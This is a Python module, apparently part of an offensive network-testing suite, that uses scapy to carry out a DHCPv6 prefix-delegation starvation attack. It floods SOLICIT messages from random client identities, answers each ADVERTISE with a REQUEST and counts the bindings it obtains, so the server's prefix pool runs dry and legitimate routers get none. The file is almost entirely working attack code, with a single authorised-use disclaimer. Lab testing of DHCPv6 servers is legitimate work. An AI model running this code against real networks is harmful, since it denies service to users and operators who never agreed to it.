"""DHCPv6 prefix delegation abuse: exhausts a delegating server's prefix pool with random client identities.

A client that asks for a delegated prefix (IA_PD) gets a block of addresses it can route downstream. For each
SOLICIT with a random DUID and IA_PD, the attacker listens for the ADVERTISE, and completes the exchange with a
REQUEST for the offered prefix. The server records a binding for that identity, so its delegation pool shrinks.
A legitimate router that asks for a prefix afterwards may get none.

The module counts bindings: REPLY messages that confirm a delegated prefix to one of its requests. That is the
measure of how much of the pool the attacker holds.

Installing the attacker as a router for the delegated prefixes is not done here; that needs Router
Advertisements, which the RA techniques in this suite cover.

The SOLICIT goes to All_DHCP_Relay_Agents_and_Servers from the link-local address derived from the MAC.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, IPv6, UDP, AsyncSniffer, sendp
from scapy.layers.dhcp6 import (
    DHCP6_Advertise,
    DHCP6_Reply,
    DHCP6_Request,
    DHCP6_Solicit,
    DHCP6OptClientId,
    DHCP6OptIA_PD,
    DHCP6OptIAPrefix,
    DHCP6OptServerId,
    DUID_LLT,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac
from macabre.attacks.dhcpv6_starvation import (
    ALL_DHCP_SERVERS_IP,
    ALL_DHCP_SERVERS_MAC,
    CLIENT_PORT,
    SERVER_PORT,
    link_local_from_mac,
)

MAX_PENDING = 10_000
MIN_PLEN = 48
MAX_PLEN = 64


@dataclass(frozen=True)
class Dhcpv6PrefixDelegationAbuseConfig:
    iface: str
    count: int = 0            # SOLICIT messages to send; 0 = run until stopped
    interval: float = 0.05    # seconds between SOLICIT messages
    plen: int = 56            # prefix length asked for (a hint; the server decides)
    request: bool = True      # answer each ADVERTISE with a REQUEST (creates the binding)
    drain: float = 2.0        # seconds to keep listening for REPLYs after the last SOLICIT
    dry_run: bool = False     # build messages but do not send them

    def __post_init__(self) -> None:
        if self.count < 0:
            raise ValueError("Count cannot be negative.")
        if self.interval < 0:
            raise ValueError("Interval cannot be negative.")
        if self.drain < 0:
            raise ValueError("Drain cannot be negative.")
        if not MIN_PLEN <= self.plen <= MAX_PLEN:
            raise ValueError(f"Prefix length must be between /{MIN_PLEN} and /{MAX_PLEN}.")


@dataclass
class Dhcpv6PrefixDelegationAbuseStats:
    solicits: int = 0
    advertises: int = 0
    requests: int = 0
    bindings: int = 0
    status: str = ""


def build_solicit(mac: str, trid: int, iaid: int, plen: int) -> Packet:
    """SOLICIT from a client with DUID-LLT of `mac`, asking for a delegated prefix with a length hint."""
    mac = normalize_unicast_mac(mac)
    return (
        Ether(src=mac, dst=ALL_DHCP_SERVERS_MAC)
        / IPv6(src=link_local_from_mac(mac), dst=ALL_DHCP_SERVERS_IP)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / DHCP6_Solicit(trid=trid)
        / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
        / DHCP6OptIA_PD(iaid=iaid, T1=0, T2=0, iapdopt=[DHCP6OptIAPrefix(plen=plen, prefix="::")])
    )


def build_request(mac: str, trid: int, iaid: int, server_mac: str, prefix: str, plen: int) -> Packet:
    """REQUEST for the prefix an ADVERTISE offered, addressed to the advertising server."""
    mac = normalize_unicast_mac(mac)
    server = normalize_unicast_mac(server_mac)
    return (
        Ether(src=mac, dst=ALL_DHCP_SERVERS_MAC)
        / IPv6(src=link_local_from_mac(mac), dst=ALL_DHCP_SERVERS_IP)
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / DHCP6_Request(trid=trid)
        / DHCP6OptClientId(duid=DUID_LLT(lladdr=mac, timeval=0))
        / DHCP6OptServerId(duid=DUID_LLT(lladdr=server, timeval=0))
        / DHCP6OptIA_PD(iaid=iaid, T1=0, T2=0, iapdopt=[DHCP6OptIAPrefix(plen=plen, prefix=prefix)])
    )


@dataclass(frozen=True)
class OfferedPrefix:
    trid: int
    client_mac: str
    server_mac: str
    prefix: str
    plen: int
    iaid: int


def parse_advertise(packet: Packet) -> OfferedPrefix | None:
    """Fields of an ADVERTISE that offers a delegated prefix, or None."""
    if not (packet.haslayer(DHCP6_Advertise) and packet.haslayer(DHCP6OptIA_PD)):
        return None
    if not (packet.haslayer(DHCP6OptServerId) and packet.haslayer(DHCP6OptClientId)):
        return None
    ia = packet[DHCP6OptIA_PD]
    if not ia.iapdopt:
        return None
    offered = ia.iapdopt[0]
    return OfferedPrefix(
        trid=packet[DHCP6_Advertise].trid,
        client_mac=packet[DHCP6OptClientId].duid.lladdr,
        server_mac=packet[DHCP6OptServerId].duid.lladdr,
        prefix=offered.prefix,
        plen=offered.plen,
        iaid=ia.iaid,
    )


def reply_confirms_prefix(packet: Packet) -> tuple[int, str] | None:
    """(trid, prefix) for a REPLY that confirms a delegated prefix, or None."""
    if not (packet.haslayer(DHCP6_Reply) and packet.haslayer(DHCP6OptIA_PD)):
        return None
    ia = packet[DHCP6OptIA_PD]
    if not ia.iapdopt:
        return None
    return packet[DHCP6_Reply].trid, ia.iapdopt[0].prefix


def request_prefix_once(
    iface: str,
    mac: str,
    plen: int,
    timeout: float,
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> str | None:
    """One legitimate exchange (SOLICIT, REQUEST) for a prefix, from `mac`. Returns the prefix or None.

    Used by the lab as the control client. It sends the same messages a real requesting router would.
    """
    rng = rng or random.Random()
    send = send or sendp
    trid = rng.getrandbits(24)
    iaid = rng.getrandbits(32)

    # Start listening before sending, so a fast reply cannot arrive before the sniffer is up.
    def wait_for(predicate):
        sniffer = AsyncSniffer(iface=iface, store=True, lfilter=predicate)
        sniffer.start()
        time.sleep(0.2)
        return sniffer

    advert_sniffer = wait_for(lambda p: parse_advertise(p) is not None)
    send(build_solicit(mac, trid, iaid, plen), iface=iface, verbose=False)
    advert_sniffer.join(timeout=timeout)
    advertises = advert_sniffer.results or []
    if not advertises:
        return None
    offer = parse_advertise(advertises[0])
    if offer is None or offer.trid != trid:
        return None

    reply_sniffer = wait_for(lambda p: reply_confirms_prefix(p) is not None)
    send(build_request(mac, trid, iaid, offer.server_mac, offer.prefix, offer.plen), iface=iface, verbose=False)
    reply_sniffer.join(timeout=timeout)
    replies = reply_sniffer.results or []
    if not replies:
        return None
    confirmed = reply_confirms_prefix(replies[0])
    if confirmed is None or confirmed[0] != trid:
        return None
    return f"{confirmed[1]}/{offer.plen}"


def run_dhcpv6_prefix_delegation_abuse(
    config: Dhcpv6PrefixDelegationAbuseConfig,
    stop_event: threading.Event,
    on_progress: Callable[[Dhcpv6PrefixDelegationAbuseStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> Dhcpv6PrefixDelegationAbuseStats:
    """Send SOLICIT messages with random identities, answer advertises and count confirmed prefixes."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = Dhcpv6PrefixDelegationAbuseStats(
            status=(
                f"Dry run: would send {config.count or 'unlimited'} DHCPv6 SOLICIT messages asking for "
                f"/{config.plen} prefixes with random client identities on {config.iface}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = Dhcpv6PrefixDelegationAbuseStats()
    pending: dict[tuple[str, int], int] = {}      # (client MAC, trid) -> iaid, waiting for an ADVERTISE
    requested: dict[tuple[str, int], int] = {}    # (client MAC, trid) -> iaid, waiting for a REPLY
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        confirmed = reply_confirms_prefix(packet)
        if confirmed is not None:
            trid, _prefix = confirmed
            client = packet[DHCP6OptClientId].duid.lladdr if packet.haslayer(DHCP6OptClientId) else ""
            with lock:
                if (client, trid) not in requested:
                    return
                requested.pop((client, trid))
                stats.bindings += 1
                snapshot = replace(stats)
            on_progress(snapshot)
            return

        offer = parse_advertise(packet)
        if offer is None:
            return
        key = (offer.client_mac, offer.trid)
        with lock:
            if key not in pending:
                return
            stats.advertises += 1
            pending.pop(key)
            if config.request:
                requested[key] = offer.iaid
                stats.requests += 1
            snapshot = replace(stats)
        if config.request:
            send(build_request(offer.client_mac, offer.trid, offer.iaid, offer.server_mac,
                               offer.prefix, offer.plen),
                 iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        while not stop_event.is_set() and (config.count == 0 or stats.solicits < config.count):
            mac = random_mac(rng)
            trid = rng.getrandbits(24)
            iaid = rng.getrandbits(32)
            with lock:
                if len(pending) < MAX_PENDING:
                    pending[(mac, trid)] = iaid
                stats.solicits += 1
                snapshot = replace(stats)
            send(build_solicit(mac, trid, iaid, config.plen), iface=config.iface, verbose=False)
            on_progress(snapshot)
            stop_event.wait(config.interval)
        if not stop_event.is_set() and config.drain > 0:
            stop_event.wait(config.drain)
    finally:
        sniffer.stop()
    return stats
